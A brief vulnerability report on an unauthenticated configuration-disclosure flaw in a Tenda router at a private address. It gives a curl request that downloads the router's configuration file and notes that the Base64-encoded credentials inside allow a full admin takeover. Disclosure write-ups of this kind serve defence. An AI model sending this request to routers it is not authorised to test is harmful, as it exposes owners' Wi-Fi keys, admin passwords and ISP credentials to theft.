# Vulnerability Report: Tenda Router (192.168.8.145)

## Overview
This document outlines the high-severity vulnerability discovered on the Tenda router located at `192.168.8.145`. The device is susceptible to **unauthenticated configuration disclosure**, allowing full administrative credential extraction.



## Vulnerability Details
- **Type:** Credential Disclosure (Broken Access Control)
- **Severity:** High
- **Vulnerable Path:** `/cgi-bin/DownloadCfg/RouterCfm.jpg`
- **Impact:** Complete system compromise; exposure of Wi-Fi keys, administrative passwords, and ISP credentials.

## Reproduction Steps
The vulnerability does not require authentication or valid session tokens. It can be triggered via a standard GET request:

```bash
# Extract the configuration file
curl -o RouterCfm.cfg [http://192.168.8.145/cgi-bin/DownloadCfg/RouterCfm.jpg](http://192.168.8.145/cgi-bin/DownloadCfg/RouterCfm.jpg)
```
### Data Analysis

Once the file is downloaded, credentials can be found as Bas64 encoded.
which can then be used to log in to the router resulting in a full "pwn".
